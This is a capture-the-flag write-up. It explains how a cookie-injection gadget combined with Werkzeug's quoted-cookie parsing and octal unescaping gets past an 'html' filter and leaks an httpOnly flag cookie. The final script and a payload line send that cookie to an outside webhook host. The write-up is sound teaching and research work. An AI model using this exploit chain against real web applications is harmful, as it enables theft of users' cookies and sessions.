---
source: kevin-mizu
source_url: https://mizu.re/post/another-html-renderer
title: "Another HTML Renderer | mizu.re"
description: "Another HTML Renderer"
---

_keyboard\_arrow\_up_

title: Another HTML Renderer

date: Nov 03, 2023

tags: [Writeup](https://mizu.re/tag/Writeup) [Web](https://mizu.re/tag/Web) [XSS](https://mizu.re/tag/XSS)

# Another HTML Renderer

![](https://mizu.re/articles/writeups/grehack2023/another_html_renderer/images/grephack.png)

* * *

Difficulty: 500 points \| 0 solves

Description: Is this really an XSS challenge 🤔

Sources: [another\_html\_renderer.zip](https://mizu.re/articles/writeups/grehack2023/another_html_renderer/another_html_renderer.zip)

Author: [Me :p](https://twitter.com/kevin_mizu)

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/another-html-renderer#%EF%B8%8F-recon)
- [🍪 Settings partial cookie injection](https://mizu.re/post/another-html-renderer#-settings-partial-cookie-injection)
- [❓ Werkzeug bad cookie parsing](https://mizu.re/post/another-html-renderer#-werkzeug-bad-cookie-parsing)
- [💧 Leaking the flag](https://mizu.re/post/another-html-renderer#-leaking-the-flag)
- [💥 TL/DR: Chain everything together](https://mizu.re/post/another-html-renderer#-tldr-chain-everything-together)
- [🚩 Retrieve the flag](https://mizu.re/post/another-html-renderer#-retrieve-the-flag)

## 🕵️ Recon

This challenge has a very minimalist HTML rendering interface:

![home.png](https://mizu.re/articles/writeups/grehack2023/another_html_renderer/images/home.png)

With a short flask back-end with only one route (excluding /report):

- /src/app.py:

```python
@app.route("/render")
def index():
    settings = ""
    try:
        settings = loads(request.cookies.get("settings"))
    except: pass

    if settings:
        res = make_response(render_template("index.html",
            backgroundColor=settings["backgroundColor"] if "backgroundColor" in settings else "#ffde8c",
            textColor=settings["textColor"] if "textColor" in settings else "#000000",
            html=settings["html"] if "html" in settings else ""
        ))
    else:
        res = make_response(render_template("index.html", backgroundColor="#ffde8c", textColor="#000000"))
        res.set_cookie("settings", "{}")

    return res
```

As we can see, there is a cookie based settings management. One the other part, the front-end renders the HTML using a very strong sandboxed iframe's configuration:

```html
<iframe id="render" sandbox="" srcdoc="<style>* { text-align: center; }</style>{{html}}" width="70%" height="500px"></iframe>
```

Due to sandbox="" attribute, the iframe doesn't share the same origin as the top window and block any javascript execution.

Additionally, the only exposed GET parameter is settings= which allows to configure the backgroundColor and the textColor:

- /src/static/js/main.js:

```js
//...
window.onload = () => {
    // settings init
    const params = (new URLSearchParams(window.location.search));
    if (params.get("settings")) {
        window.settings = getSettings(params.get("settings"));
        saveSettings(window.settings);
        renderSettings(window.settings);
    }
    // ...
}
```

The final goal of the challenge is to leak the flag cookie:

- /src/bot/bot.js:

```js
await page.setCookie({
    "name" : "flag",
    "value" : "GH{FAKE_FLAG}",
    "domain" : host,
    "httpOnly": true,
    "sameSite": "Lax"
});
```

As you can see, even using an XSS, it won't be possible to read the flag.

## 🍪 Settings partial cookie injection

At first glance, the challenge might look impossible or requiring a 0 day. Therefore, there is a small mistake in the code that could be abused:

- /src/static/js/main.js:

```js
const saveSettings = (settings) => {
    document.cookie = `settings=${settings}`;
}

// ...
// can't load HTML from qs.
const getSettings = (d) => {
    try {
        s = JSON.parse(d);
        delete s.html;
        return JSON.stringify(s);
    } catch {
        while (d != d.replaceAll("html", "")) {
            d = d.replaceAll("html", "");
        }
        return d;
    }
}

window.onload = () => {
    // settings init
    const params = (new URLSearchParams(window.location.search));
    if (params.get("settings")) {
        window.settings = getSettings(params.get("settings"));
        saveSettings(window.settings);
        renderSettings(window.settings);
    } else {
        window.settings = getCookie("settings");
    }
    window.settings = JSON.parse(window.settings);
```

In the above snippet, in case the user provides an invalid JSON, it will remove html from the input string and use this inside:

- /src/static/js/main.js:

```js
document.cookie = `settings=${settings}`;
```

This might look insignificant as a valid JSON is required for the application to work, however it still can be used to fully control the settings cookie :p

```js
var user_input  = `XXXXX; path=/`;
document.cookie = `settings=${user_input}`;
```

_This can be used to set several settings cookies with a custom value._

## ❓ Werkzeug bad cookie parsing

> The previous gadget is funny but, how can this be abuse in some way? 🤔

This is where the [werkzeug](https://github.com/pallets/werkzeug) power becomes interesting 👀

Looking into the [werkzeug](https://github.com/pallets/werkzeug) Cookie header parsing, we can find the following regex:

- werkzeug \> /src/werkzeug/sansio/http.py ( [ref](https://github.com/pallets/werkzeug/blob/f3c803b3ade485a45f12b6d6617595350c0f03e2/src/werkzeug/sansio/http.py#L97))

```python
_cookie_re = re.compile(
    r"""
    ([^=;]*)
    (?:\s*=\s*
      (
        "(?:[^\\"]|\\.)*"
      |
        .*?
      )
    )?
    \s*;\s*
    """,
    flags=re.ASCII | re.VERBOSE,
)
```

> What's wrong with this regex?

In fact, in case a cookie value starts with a ", it will match any chars (even ;), until finding another ". If this 2nd " exist, and the following chars is an ;, it will resolve it as the cookie value :)

In other words:

- This will result in 2 cookies on the front-end:

```js
document.cookie = `a="mizu`;
document.cookie = `aa=mizu"`;
```

- After being parsed by werkzeug, it will give 👀

![cookie-werkzeug.png](https://mizu.re/articles/writeups/grehack2023/another_html_renderer/images/cookie-werkzeug.png)

In order to take part of this, it is import to know how does browsers sort cookie:

1\. Domain and Path

2\. Creation Time

3\. Cookie Size

4\. Expiration Time

5\. ...

So, by creating 2 settings cookie, it is possible to generate to following setup 🔥

```
Cookie: settings="aa; flag=GH{FAKE_FLAG}; settings=aa"
```

Which will result in 1 settings cookie containing the flag into it.

## 💧 Leaking the flag

> Using the werkzeug bad cookie parsing, we can wrap several cookie together, but how could it be leak without HTML Injection / XSS?

In fact, there is another [werkzeug](https://github.com/pallets/werkzeug) behavior that we can use to get an HTML Injection:

- werkzeug \> /src/werkzeug/sansio/http.py ( [ref](https://github.com/pallets/werkzeug/blob/f3c803b3ade485a45f12b6d6617595350c0f03e2/src/werkzeug/sansio/http.py#L114))

```python
_cookie_unslash_re = re.compile(rb"\\([0-3][0-7]{2}|.)")

def _cookie_unslash_replace(m: t.Match[bytes]) -> bytes:
    v = m.group(1)

    if len(v) == 1:
        return v

    return int(v, 8).to_bytes(1, "big")

# ...
if len(cv) >= 2 and cv[0] == cv[-1] == '"':
    cv = _cookie_unslash_re.sub(
        _cookie_unslash_replace, cv[1:-1].encode()
    ).decode(errors="replace")
```

In the above code snippet, in case the cookie value start / end with a " (which is what we are abusing), it will decode the \\{octal} value to string! 🤨

Using it, we can bypass the html replace security using \\150tml

```js
const getSettings = (d) => {
    try {
        s = JSON.parse(d);
        delete s.html;
        return JSON.stringify(s);
    } catch {
        while (d != d.replaceAll("html", "")) {
            d = d.replaceAll("html", "");
        }
        return d;
    }
}
```

Thanks to this bypass, we can create the following setup:

```header
Cookie: settings="{\"\150tml\": "<img src='https://leak-domain/?cookie= ;flag=GH{FAKE_FLAG}; settings='>\"}"
```

Which will result in the following back-end settings cookie value: 🤯

```json
{
    "html": "<img src='https://leak-domain/?cookie= ;flag=GH{FAKE_FLAG}; settings='>"
}
```

Even if this input is reflected input a sandboxed iframe, the image will be load leaking the flag cookie 😎

## 💥 TL/DR: Chain everything together

1\. Set the first part of the settings cookie to /render.

2\. Set the second part of the settings cookie to /.

3\. Redirect to bot to /render.

```html
<script>
    // 1
    var part1 = window.open(`http://127.0.0.1:5000/render?settings="{\\"\\150tml\\":\\"<img src='https://webhook.site/332b8b7a-9a08-4c3e-bb5d-59bf9b1bc95f?cookie=;path=/render`);

    //2
    var part2 = window.open(`http://127.0.0.1:5000/render?settings=aaaaaaaa'>\\"}";path=/`);

    // 3
    setTimeout(() => {
        location.href = "http://127.0.0.1:5000/render";
    }, 500);
</script>
```

## 🚩 Retrieve the flag

Host the previous HTML file on an HTTP server and send the bot into it:

![flag.png](https://mizu.re/articles/writeups/grehack2023/another_html_renderer/images/flag.png)

Flag: GH{WtF\_1s\_Th4t\_C00ki3\_P4rS1ng} 🎉

[_keyboard\_arrow\_left_ Intigriti January 2024 - XSS Challenge](https://mizu.re/post/intigriti-january-2024-xss-challenge)

[Insecure Session Storage _keyboard\_arrow\_right_](https://mizu.re/post/insecure-session-storage)